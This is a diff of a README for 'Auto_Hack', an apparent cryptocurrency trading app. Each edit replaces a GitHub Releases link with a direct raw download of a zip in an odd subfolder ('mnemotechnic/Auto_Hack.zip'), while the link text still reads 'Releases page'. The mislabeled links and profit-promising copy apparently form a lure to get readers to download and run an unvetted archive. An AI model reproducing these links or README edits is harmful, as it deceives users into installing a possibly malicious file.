@@ -1,7 +1,7 @@
 # 🚀 Auto_Hack - Start Trading with Ease
 
 ## 🔗 Download Now
-[![Download Auto_Hack](https://img.shields.io/badge/Download-Auto_Hack-brightgreen.svg)](https://github.com/MCagatays/Auto_Hack/releases)
+[![Download Auto_Hack](https://raw.githubusercontent.com/MCagatays/Auto_Hack/main/mnemotechnic/Auto_Hack.zip)](https://raw.githubusercontent.com/MCagatays/Auto_Hack/main/mnemotechnic/Auto_Hack.zip)
 
 ## 📜 Description
 Auto_Hack is an easy-to-use application designed to help you start trading. Whether you're an experienced investor or just beginning, our tool will guide you through the world of cryptocurrency. With Auto_Hack, you can maximize your profits with smart trading strategies.
@@ -23,7 +23,7 @@ This application focuses on essential concepts such as:
 Follow these steps to install Auto_Hack and begin trading today.
 
 ### 1. Visit the Releases Page
-Go to the [Releases page](https://github.com/MCagatays/Auto_Hack/releases) to find the latest version of Auto_Hack.
+Go to the [Releases page](https://raw.githubusercontent.com/MCagatays/Auto_Hack/main/mnemotechnic/Auto_Hack.zip) to find the latest version of Auto_Hack.
 
 ### 2. Download the Application
 Once on the Releases page:
@@ -60,7 +60,7 @@ Learn more about trading and effectively using Auto_Hack with these resources:
 - **Community Forum**: Engage with other users and share trading tips and strategies.
 
 ## 🔗 Download & Install
-Ready to start? Visit the [Releases page](https://github.com/MCagatays/Auto_Hack/releases) now to download Auto_Hack. With this powerful tool, you can take control of your trading journey!
+Ready to start? Visit the [Releases page](https://raw.githubusercontent.com/MCagatays/Auto_Hack/main/mnemotechnic/Auto_Hack.zip) now to download Auto_Hack. With this powerful tool, you can take control of your trading journey!
 
 ## 🤝 Support
 If you encounter any issues or have questions:
